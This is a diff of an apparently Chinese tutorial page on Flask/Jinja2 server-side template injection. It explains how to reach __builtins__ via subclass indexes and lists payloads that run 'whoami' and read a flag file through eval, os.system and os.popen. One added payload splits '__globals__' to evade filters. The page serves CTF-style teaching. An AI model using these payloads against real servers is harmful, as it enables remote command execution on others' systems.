@@ -434,7 +434,6 @@ True
 <p>首先__builtins__是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__builtins__这类模块在Python启动时为我们导入了，可以使用dir(<strong>builtins</strong>)来查看调用方法的列表，然后可以发现__builtins__下有eval，__import__等的函数，因此可以利用此来执行命令。</p>
 <p>把上面find.py脚本search变量赋值为__builtins__，然后找到第140个类warnings.catch_warnings含有他，而且这里的话比较多的类都含有__builtins__，比如常用的还有email.header._ValueFormatter等等，这也可能是为什么这种方法比较多人用的原因之一吧</p>
 <p>再调用eval等函数和方法即可，payload如下</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;
 
 &#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
@@ -890,6 +889,7 @@ payload:
 <p>socket._socketobject（一般在71）、site._Printer等模块</p>
 <pre><code>payload:
 &#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;
+&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;
 </code></pre>
 <p>3、有builtins的类</p>
 <p>__ builtins __代码执行（最常用的方法）</p>
